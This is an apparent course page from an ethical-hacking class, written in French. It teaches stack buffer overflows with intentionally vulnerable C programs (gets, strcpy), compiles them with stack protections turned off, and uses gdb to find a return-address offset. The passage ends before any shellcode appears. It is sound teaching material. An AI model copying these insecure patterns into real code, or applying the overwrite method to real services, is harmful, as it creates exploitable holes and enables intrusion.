<!DOCTYPE html>
<html lang="fr-ca" dir="ltr" itemscope itemtype="http://schema.org/Article">
  <head><script src="/420-513/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=420-513/livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.123.7">
    <meta name="generator" content="Relearn 6.1.1+tip">
    <meta name="description" content="Les buffer overflows (ou débordements de mémoire, dépassement de tampon) sont une technique qui vise à exploiter une vulnérabilité dans la gestion de l’espace mémoire allouée à un fichier exécutable. Cette exploitation permet d’écrire dans la RAM d’un hôte, et donc d’y injecter des instructions qui permettront d’exécuter du code à distance (si l’exécutable est un service sur un hôte distant) ou de lancer un programme avec des privilèges élevés (si l’exécutable a les permissions root).">
    <meta name="author" content="">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Buffer Overflows :: 420-513">
    <meta name="twitter:description" content="Les buffer overflows (ou débordements de mémoire, dépassement de tampon) sont une technique qui vise à exploiter une vulnérabilité dans la gestion de l’espace mémoire allouée à un fichier exécutable. Cette exploitation permet d’écrire dans la RAM d’un hôte, et donc d’y injecter des instructions qui permettront d’exécuter du code à distance (si l’exécutable est un service sur un hôte distant) ou de lancer un programme avec des privilèges élevés (si l’exécutable a les permissions root).">
    <meta property="og:url" content="http://localhost:1313/420-513/exploitation/bof/index.html">
    <meta property="og:site_name" content="420-513">
    <meta property="og:title" content="Buffer Overflows :: 420-513">
    <meta property="og:description" content="Les buffer overflows (ou débordements de mémoire, dépassement de tampon) sont une technique qui vise à exploiter une vulnérabilité dans la gestion de l’espace mémoire allouée à un fichier exécutable. Cette exploitation permet d’écrire dans la RAM d’un hôte, et donc d’y injecter des instructions qui permettront d’exécuter du code à distance (si l’exécutable est un service sur un hôte distant) ou de lancer un programme avec des privilèges élevés (si l’exécutable a les permissions root).">
    <meta property="og:locale" content="fr_ca">
    <meta property="og:type" content="article">
    <meta property="article:section" content="Exploitation">
    <meta property="article:published_time" content="2024-11-03T15:07:15-05:00">
    <meta property="article:modified_time" content="2024-11-03T15:07:15-05:00">
    <meta itemprop="name" content="Buffer Overflows :: 420-513">
    <meta itemprop="description" content="Les buffer overflows (ou débordements de mémoire, dépassement de tampon) sont une technique qui vise à exploiter une vulnérabilité dans la gestion de l’espace mémoire allouée à un fichier exécutable. Cette exploitation permet d’écrire dans la RAM d’un hôte, et donc d’y injecter des instructions qui permettront d’exécuter du code à distance (si l’exécutable est un service sur un hôte distant) ou de lancer un programme avec des privilèges élevés (si l’exécutable a les permissions root).">
    <meta itemprop="datePublished" content="2024-11-03T15:07:15-05:00">
    <meta itemprop="dateModified" content="2024-11-03T15:07:15-05:00">
    <meta itemprop="wordCount" content="3507">
    <title>Buffer Overflows :: 420-513</title><link rel="icon" href="/420-513/images/favicon.png" type="image/png">
    <link href="/420-513/css/fontawesome-all.min.css?1731358439" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/420-513/css/fontawesome-all.min.css?1731358439" rel="stylesheet"></noscript>
    <link href="/420-513/css/nucleus.css?1731358439" rel="stylesheet">
    <link href="/420-513/css/auto-complete.css?1731358439" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/420-513/css/auto-complete.css?1731358439" rel="stylesheet"></noscript>
    <link href="/420-513/css/perfect-scrollbar.min.css?1731358439" rel="stylesheet">
    <link href="/420-513/css/fonts.css?1731358439" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/420-513/css/fonts.css?1731358439" rel="stylesheet"></noscript>
    <link href="/420-513/css/theme.css?1731358439" rel="stylesheet">
    <link href="/420-513/css/theme-red.css?1731358439" rel="stylesheet" id="R-variant-style">
    <link href="/420-513/css/chroma-learn.css?1731358439" rel="stylesheet" id="R-variant-chroma-style">
    <link href="/420-513/css/variant.css?1731358439" rel="stylesheet">
    <link href="/420-513/css/print.css?1731358439" rel="stylesheet" media="print">
    <script src="/420-513/js/variant.js?1731358439"></script>
    <script>
      window.relearn = window.relearn || {};
      window.relearn.relBasePath='..\/..';
      window.relearn.relBaseUri='..\/..\/..';
      window.relearn.absBaseUri='http:\/\/localhost:1313\/420-513';
      // variant stuff
      window.variants && variants.init( [ 'red' ] );
      // translations
      window.T_Copy_to_clipboard = `Copy to clipboard`;
      window.T_Copied_to_clipboard = `Copied to clipboard!`;
      window.T_Copy_link_to_clipboard = `Copy link to clipboard`;
      window.T_Link_copied_to_clipboard = `Copied link to clipboard!`;
      window.T_Reset_view = `Reset view`;
      window.T_View_reset = `View reset!`;
      window.T_No_results_found = `No results found for "{0}"`;
      window.T_N_results_found = `{1} results found for "{0}"`;
    </script>
  </head>
  <body class="mobile-support html disableInlineCopyToClipboard" data-url="/420-513/exploitation/bof/index.html">
    <div id="R-body" class="default-animation">
      <div id="R-body-overlay"></div>
      <nav id="R-topbar">
        <div class="topbar-wrapper">
          <div class="topbar-sidebar-divider"></div>
          <div class="topbar-area topbar-area-start" data-area="start">
            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide"><button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button>
            </div>
          </div>
          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li
            itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/420-513/index.html"><span itemprop="name">Piratage éthique</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li
            itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/420-513/exploitation/index.html"><span itemprop="name">Exploitation</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li
            itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><span itemprop="name">Buffer Overflows</span><meta itemprop="position" content="3"></li>
          </ol>
          <div class="topbar-area topbar-area-end" data-area="end">
            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show"><button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
                  <div class="topbar-area topbar-area-more" data-area="more">
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </nav>
      <div id="R-main-overlay"></div>
      <main id="R-body-inner" class="highlightable default" tabindex="-1">
        <div class="flex-block-wrapper">
          <article class="default">
            <header class="headline">
            </header>

<h1 id="buffer-overflows">Buffer Overflows</h1>

<p>Les <em>buffer overflows</em> (ou débordements de mémoire, dépassement de tampon) sont une technique qui vise à exploiter une vulnérabilité dans la gestion de l’espace mémoire allouée à un fichier exécutable. Cette exploitation permet d’écrire dans la RAM d’un hôte, et donc d’y injecter des instructions qui permettront d’exécuter du code à distance (si l’exécutable est un service sur un hôte distant) ou de lancer un programme avec des privilèges élevés (si l’exécutable a les permissions <em>root</em>).</p>
<p>Dans ce cours nous verrons comment utiliser <code>gdb</code> pour inspecter l’usage de la mémoire (plus spécifiquement: de la <em>pile</em>) lors de l’exécution d’un programme vulnérable codé en langage C, comment contrôler l’exécution d’un programme en manipulant les valeurs des registres et finalement comment faire exécuter un <em>shellcode</em>.</p>
<h2 id="exemple">Exemple</h2>
<p>Sauvegardez le programme suivant dans un fichier nommé <strong>bo_1.c</strong>:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> motDePasse[<span style="color:#ae81ff">10</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> valeurLue[<span style="color:#ae81ff">10</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strncpy</span>(motDePasse, <span style="color:#e6db74">&#34;abc-123&#34;</span>, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Entrez le mot de passe: &#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">gets</span>(valeurLue);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">strncmp</span>(motDePasse, valeurLue, <span style="color:#ae81ff">10</span>)){
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Bravo!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Mauvaise reponse!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;MDP: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, motDePasse);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>Dans ce programme, la fonction <code>gets</code> est vulnérable: elle lit la valeur entrée sur la ligne de commande et l’affecte à la variable en paramètre (ici, valeurLue) mais ne vérifie pas si cette valeur respecte la taille de la variable. Si la valeur saisie est de taille supérieure, elle dépassera la zone mémoire allouée à la variable.</p>
<p>Pour créer le fichier exécutable du programme on doit le compiler avec la commande suivante:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ gcc -g bo_1.c -o bo_1 -fno-stack-protector -z execstack</span></span></code></pre></div><p>Si on entre une valeur dont la taille est supérieure à 10 (par exemple une séquence de 12 &ldquo;x&rdquo;), on verra qu’elle &ldquo;déborde&rdquo; sur la variable <strong><em>motDePasse</em></strong>:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>└─$ ./bo_1 
Entrez le mot de passe: xxxxxxxxxxxx
Mauvaise reponse!
MDP: xx</code></pre></div>
<div class="box notices cstyle tip">
  <div class="box-label"><i class="fa-fw fas fa-lightbulb"></i> Petite question&hellip;</div>
  <div class="box-content">

<p>Quelle taille doit avoir <strong><em>valeurLue</em></strong> pour que la valeur de <strong><em>motDePasse</em></strong> soit &ldquo;xxxxxx&rdquo;?</p>
<p>À partir de quelle taille de <strong><em>valeurLue</em></strong> les deux variables ont-elles la même valeur?</p>
</div>
</div>
<h3 id="analyse-avec-_gdb_">Analyse avec <em>gdb</em></h3>
<p>Pour voir de plus près ce qui se passe, on utilisera <em>gdb</em>, un débogueur qui permet d’inspecter avec précision les opérations effectuées par un programme en mémoire. Dans Kali on l’installe comme suit:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>└─$ sudo apt install gdb</code></pre></div><p>Pour lancer le débogage de notre programme:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>└─$ gdb bo_1
Reading symbols from bo_1...
(gdb) </code></pre></div><p>Pour analyser ce qui se passe au moment où notre programme s’exécute, on définira un <strong>point d’arrêt</strong>, ce qui permet d’interrompre l’exécution à un endroit précis du programme afin d’inspecter les valeurs des différentes variables qu’il contient à ce moment de son exécution. Ici, on met un point d’arrêt à la ligne 16 et ensuite on lance le programme:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) break 16
Breakpoint 1 at 0x11ed: file bo1.c, line 16.
(gdb) run
Starting program: /home/kali/bo_1 
Entrez le mot de passe: </code></pre></div><p>Le programme s’exécute normalement et nous demande d’entrer une valeur; ensuite il s’arrêtera à l’endroit que nous avons défini:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>Entrez le mot de passe: xxxxxxxx
Mauvaise reponse!

Breakpoint 1, main () at bo1.c:16
16	        printf(&#34;MDP: %s\n&#34;, motDePasse);
(gdb) </code></pre></div><p>Lorsque le programme s’est interrompu, on peut inspecter les valeurs des différents pointeurs utiles à son exécution avec la commande <code>info frame</code>. La valeur qui nous intéresse ici est &ldquo;Locals&rdquo;, le début de la zone mémoire où sont stockées les variables locales:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) info frame
Stack level 0, frame at 0x7fffffffe380:
 rip = 0x5555555551ed in main (bo1.c:16); saved rip = 0x7ffff7e17e4a
 source language c.
 Arglist at 0x7fffffffe370, args: 
 Locals at 0x7fffffffe370, Previous frame&#39;s sp is 0x7fffffffe380
 Saved registers:
  rbp at 0x7fffffffe370, rip at 0x7fffffffe378</code></pre></div><p>Ici cela correspond à <strong>0x7fffffffe370</strong>; afin de voir le contenu de la mémoire qui précède cette adresse (où valeurLue devrait normalement se trouver) on affiche les données à partir de <strong>0x7fffffffe358</strong> avec la commande <code>x/50bx 0x7fffffffe358</code>. Le sens des termes de cette commande est celui-ci:</p>
<ul>
<li><strong>x</strong>  : Examiner la mémoire</li>
<li><strong>50</strong> : Afficher 50 unités</li>
<li><strong>b</strong>  : L’unité choisie est l’octet (byte)</li>
<li><strong>x</strong>  : Afficher les données en hexadécimal</li>
</ul>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) x/50bx 0x7fffffffe358
0x7fffffffe358:	0x90	0x50	0x55	0x55	0x78	0x78	0x78	0x78
0x7fffffffe360:	0x78	0x78	0x78	0x78	0x00	0x7f	0x61	0x62
0x7fffffffe368:	0x63	0x2d	0x31	0x32	0x33	0x00	0x00	0x00
0x7fffffffe370:	0x10	0x52	0x55	0x55	0x55	0x55	0x00	0x00
0x7fffffffe378:	0x4a	0x7e	0xe1	0xf7	0xff	0x7f	0x00	0x00
0x7fffffffe380:	0x68	0xe4	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffe388:	0x7f	0x7c</code></pre></div><p>Sachant que la valeur hexadécimale de &ldquo;x&rdquo; est 78, on arrive à repérer l’espace occupé par notre variable (de 0xe35c à 0xe363 inclusivement).</p>

<div class="box notices cstyle tip">
  <div class="box-label"><i class="fa-fw fas fa-lightbulb"></i> Petite question&hellip;</div>
  <div class="box-content">

<p>À quelle adresse débute la variable qui contient &ldquo;abc-123&rdquo; dans l&rsquo;exemple précédent?</p>
</div>
</div>
<h2 id="la-pile-dexécution">La pile d&rsquo;exécution</h2>
<p>Pour comprendre le fonctionnement d&rsquo;un BOF, il faut comprendre le fonctionnement de la pile d&rsquo;exécution (ou &ldquo;stack&rdquo;).</p>
<p>Lors de l’exécution d’un programme, on a vu que l’espace mémoire peut contenir des valeurs de variables; mais il contient aussi instructions diverses (opérations de lecture de fichiers, opérations arithmétiques, etc.) et aussi des adresses mémoire. En effet un programme ne s’exécute pas de manière linéaire: lorsqu’une fonction est appelée dans un programme, on doit se déplacer à un autre endroit de la mémoire pour exécuter les opérations qui s’y trouvent, puis ensuite revenir. Il faut donc mémoriser les adresses de différentes sections du code pour pouvoir s’y retrouver.</p>
<p>Imaginons programme dont la structure est la suivante:</p>
<p><a href="#R-image-6805d9d0ca0e4cb4c960b08b31a29cfa" class="lightbox-link"><img alt="inst" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/420-513/images/pile-instructions.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-6805d9d0ca0e4cb4c960b08b31a29cfa"><img alt="inst" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/420-513/images/pile-instructions.png"></a></p>
<p>Le point d’entrée du programme est la fonction <strong><em>main</em></strong>. L’ordre dans lequel les différentes lignes de ce programme seront lues (et exécutées) est le suivant:</p>
<blockquote>
<p>9, 10, 11, 12, 0, 1, 2, 5, 6, 7, 3, 13</p>
</blockquote>
<p>Lorsqu’une fonction est appelée (comme à la l.12), le programme sait à quel endroit se déplacer (ici, la l.0) pour poursuivre l’exécution. Mais comment sait-il où retourner lorsque la fonction est terminée (l.3)? En effet une fonction peut être appelée à plusieurs endroits dans un même programme, donc il peut y avoir plus d’une possibilité.</p>
<p>La solution à ce problème est la <em>pile</em> (&ldquo;stack&rdquo;).</p>
<p>La pile est une zone particulière de la mémoire où on stocke des informations qui permettent au programme de se repérer à travers les différents appels de fonction: chaque fois qu’on appelle une fonction, on ajoute à la pile des informations sur cette fonction; chaque fois qu’on sort d’une fonction, on supprime de la pile les informations qui la concernent.</p>
<p>Parmi ces informations on retrouve les valeurs des variables passées à la fonction, mais aussi l’adresse à partir de laquelle la fonction a été appelée. Cette adresse est celle où le programme doit retourner lorsque la fonction a terminé de s’exécuter.</p>
<p>Pour s’y retrouver, le programme a besoin de trois variables spéciales (des pointeurs) qui servent à stocker les adresses mémoire:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>IP</strong></td>
<td>Pointeur d&rsquo;instruction</td>
<td>Contient l’adresse mémoire de la prochaine instruction à exécuter</td>
</tr>
<tr>
<td><strong>BP</strong></td>
<td>Pointeur de base</td>
<td>Contient l’adresse mémoire de la base de la pile</td>
</tr>
<tr>
<td><strong>SP</strong></td>
<td>Pointeur de pile</td>
<td>Contient l’adresse mémoire du dernier élément de la pile</td>
</tr>
</tbody>
</table>
<p>Reprenons l’exemple vu plus haut: notre programme occupe une zone de la mémoire entre les adresses 0 et 13 et son point d’entrée est à l’adresse 9. La base de la pile est à l’adresse 50; lorsqu’elle est vide, <em>BP</em> et <em>SP</em> sont égaux. À noter: l’ajout d’éléments dans la pile se fait dans le sens décroissant des adresses mémoire.</p>
<p><a href="#R-image-dda05f346e192766cfb078cf5b57b0c1" class="lightbox-link"><img alt="pile-inst" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/420-513/images/pile-ptr.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-dda05f346e192766cfb078cf5b57b0c1"><img alt="pile-inst" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/420-513/images/pile-ptr.png"></a></p>
<p>Les valeurs successives que prennent les pointeurs IP, BP et SP dans ce programme sont représentées dans le tableau suivant:</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>IP</strong></td>
<td style="text-align:center">9</td>
<td style="text-align:center">10</td>
<td style="text-align:center">11</td>
<td style="text-align:center">12</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">5</td>
<td style="text-align:center">6</td>
<td style="text-align:center">7</td>
<td style="text-align:center">3</td>
<td style="text-align:center">13</td>
</tr>
<tr>
<td style="text-align:center"><strong>BP</strong></td>
<td style="text-align:center">50</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><strong>SP</strong></td>
<td style="text-align:center">50</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">49</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">48</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">49</td>
<td style="text-align:center">50</td>
</tr>
</tbody>
</table>
<p>Au début du programme, <em>BP</em> et <em>SP</em> contiennent la même adresse (50) et <em>IP</em> pointe sur l’adresse 9. Après chaque instruction, on incrémente <em>IP</em>.</p>
<p>Au moment de l’appel de la <strong><em>fonction1</em></strong>, <em>IP</em> se déplace à l’adresse 0; la valeur de la variable passée à <strong><em>fonction1</em></strong> est affectée à b, la variable locale de <strong><em>fonction1</em></strong>, et on mémorise l’adresse de retour (13). Ces deux informations sont ajoutées au-dessus de la pile et on déplace <em>SP</em> à l’adresse correspondante (49).</p>
<p>Lors de l’appel de <strong><em>fonction2</em></strong>, le même mécanisme est utilisé: on déplace <em>IP</em> à l’adresse de la <strong><em>fonction2</em></strong> (5), on ajoute la variable locale, sa valeur et l’adresse de retour au-dessus de la pile et on déplace <em>SP</em>.</p>
<p>À la fin de l’exécution de <strong><em>fonction2</em></strong>, on déplace <em>IP</em> à l’adresse de retour enregistrée (3) et on déplace <em>SP</em> à l’élément précédent de la pile (à l’adresse 49). Même chose à la fin de la <strong><em>fonction1</em></strong>: on déplace <em>IP</em> à l’adresse de retour enregistrée (13) et on déplace SP à l’élément précédent (50).</p>

<div class="box notices cstyle warning">
  <div class="box-label"><i class="fa-fw fas fa-exclamation-triangle"></i> Attention</div>
  <div class="box-content">

<p>Dans les faits, les données ajoutées à la pile ne correspondent pas à des intervalles de 1 entre les adresses mémoire (50, 49, 48, etc.) car la taille qu’elles occupent est variable. Par exemple, si les données ajoutées à la pile lors de l’appel de <strong><em>fonction1</em></strong> occupent 40 octets de données, la valeur de <em>SP</em> passera de 50 à 10.</p>
</div>
</div>
<h4 id="référence">Référence</h4>
<ul>
<li><a href="https://www.youtube.com/watch?v=RU5vUIl1vRs" rel="external" target="_blank">https://www.youtube.com/watch?v=RU5vUIl1vRs</a> (en anglais)</li>
</ul>
<h2 id="exploitation">Exploitation</h2>
<p>On a vu qu’il est possible d’écrire dans la mémoire lorsqu’un exécutable est vulnérable aux débordements. Si on arrive à écrire dans la zone réservée à l’adresse de retour, il serait possible de remplacer cette adresse par une autre adresse, et ainsi exécuter d’autres instructions que celles qui devraient l’être.</p>
<p>Aussi, on souhaite que ces &ldquo;autres&rdquo; instructions soient notre propre code. Si l’espace réservé aux variables (dans lequel on peut écrire) est suffisamment grand, on peut y injecter notre code.</p>
<p>Il faut donc:</p>
<ul>
<li>Trouver l’adresse et la taille de la zone mémoire réservée (le &ldquo;buffer&rdquo;);</li>
<li>Trouver à quelle adresse est enregistrée l’adresse de retour;</li>
<li>Remplacer l’adresse de retour par celle de la mémoire réservée;</li>
<li>Injecter le code qu’on veut exécuter dans la mémoire réservée;</li>
</ul>
<p>Dans cette section on utilisera le programme vulnérable suivant (<strong>bo_2.c</strong>):</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">maFonction</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> valeur) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>(buffer,valeur);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> nargs, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> args[]){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> valeurLue[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">maFonction</span>(args[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Termine&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>On le compile comme vu plus haut:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>gcc -g bo2.c -o bo2 -fno-stack-protector -z execstack</code></pre></div><p>Dans ce programme la fonction vulnérable est <code>strcpy</code>. Aussi, contrairement au programme précédent la chaîne de caractères doit être passée à l’exécutable au moment de son appel, comme suit:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>└─$ bo_2 xxxxxxxxxxxx</code></pre></div><p>Nous allons utiliser <em>gdb</em> pour analyser ce programme: lancez-le, ajoutez un point d’arrêt à la ligne 8 et exécutez le programme avec une série de &ldquo;x&rdquo; comme argument:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code> └─$ gdb bo_2
Reading symbols from bo_2...
(gdb) b 8
Breakpoint 1 at 0x1164: file bo_2.c, line 8.
(gdb) run xxxxxxxxxx
Starting program: /home/kali/bo_2 xxxxxxxxxxx

Breakpoint 1, maFonction (valeur=0x7fffffffe6f2 &#39;x&#39; &lt;repeats 11 times&gt;) at bo_2.c:8
8	}
(gdb) </code></pre></div><p>Le programme s’interrompt à la fin de la fonction <em>maFonction()</em>.
On peut afficher la zone de la pile où se trouve la variable &ldquo;buffer&rdquo; du programme en la nommant dans <em>gdb</em>, ce qui nous permet de voir son adresse:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) x/144bx buffer
0x7fffffffe270:	0x78	0x78	0x78	0x78	0x78	0x78	0x78	0x78
0x7fffffffe278:	0x78	0x78	0x78	0x00	0x00	0x00	0x00	0x00
0x7fffffffe280:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe288:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe290:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe298:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2b8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2c0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2c8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2d0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffe2e0:	0x70	0xe3	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffe2e8:	0x89	0x51	0x55	0x55	0x55	0x55	0x00	0x00
0x7fffffffe2f0:	0x68	0xe4	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffe2f8:	0x00	0x00	0x00	0x00	0x02	0x00	0x00	0x00</code></pre></div><p>On peut déjà constater que la variable <code>buffer</code> se trouve à <strong>0x7fffffffe270</strong>.</p>
<p>La commande <code>info frame</code> nous permet ensuite de savoir quelle est l’adresse de retour: c’est la valeur nommée &ldquo;saved rip&rdquo;:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>(gdb) info frame
Stack level 0, frame at 0x7fffffffe2f0:
 rip = 0x555555555164 in maFonction (bo_2.c:8); saved rip = 0x555555555189
 called by frame at 0x7fffffffe380
 source language c.
 Arglist at 0x7fffffffe2e0, args: valeur=0x7fffffffe6f2 &#39;x&#39; &lt;repeats 11 times&gt;
 Locals at 0x7fffffffe2e0, Previous frame&#39;s sp is 0x7fffffffe2f0
 Saved registers:
  rbp at 0x7fffffffe2e0, rip at 0x7fffffffe2e8</code></pre></div><p>En cherchant dans les données affichées plus haut, on constate que &ldquo;saved rip&rdquo; (<strong>0x555555555189</strong>) est à l’adresse <strong>0x7fffffffe2e8</strong> (notez que l’ordre des octets est inversé).</p>
<p>Pour connaître la taille de la zone mémoire dans laquelle on peut déborder AVANT d’empiéter sur l’adresse de retour, on doit calculer la différence entre l’adresse où est stockée l’adresse de retour et l’adresse de la variable qu’on souhaite faire déborder (&ldquo;buffer&rdquo;):</p>
<blockquote>
<p>0xe2e8 – 0xe270 = 0x78 (en décimal: 120)</p>
</blockquote>
